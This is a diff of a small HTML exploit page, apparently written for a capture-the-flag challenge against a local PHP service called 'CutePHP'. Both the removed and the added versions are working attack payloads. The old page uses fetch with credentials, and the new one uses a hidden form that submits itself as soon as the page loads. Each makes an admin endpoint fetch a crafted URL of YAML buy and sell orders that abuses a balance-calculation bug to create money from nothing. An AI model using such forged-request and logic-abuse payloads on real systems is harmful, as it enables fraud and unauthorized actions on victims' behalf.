@@ -1,27 +1,7 @@
-<!DOCTYPE html>
-<html>
-<head><title>CutePHP Exploit - Value Bug</title></head>
-<body>
-    <h1>Trying value bug exploit...</h1>
-    <script>
-        // Try exploiting the "$balance += $value ? $value : $amount;" logic
-        // If we can make $value = 0, we get $amount added directly
-        fetch('http://localhost:5000/admin.php', {
-            method: 'POST',
-            body: new URLSearchParams({
-                url: 'http://localhost:5000/index.php?html=' + encodeURIComponent(
-                    '- amount: 999999\n' +
-                    '  currency: US\n' +
-                    '  op: SELL\n' +
-                    '- amount: 1\n' +
-                    '  currency: FL\n' +
-                    '  op: BUY'
-                )
-            }),
-            credentials: 'include'
-        }).then(r => r.text()).then(result => {
-            document.body.innerHTML = '<pre>' + result + '</pre>';
-        });
-    </script>
-</body>
-</html>
+<!doctype html>
+<meta charset="utf-8">
+<form id="f" action="http://localhost:5000/admin.php" method="POST">
+  <input type="hidden" name="url"
+    value="http://localhost:5000/index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
+</form>
+<script>f.submit()</script>
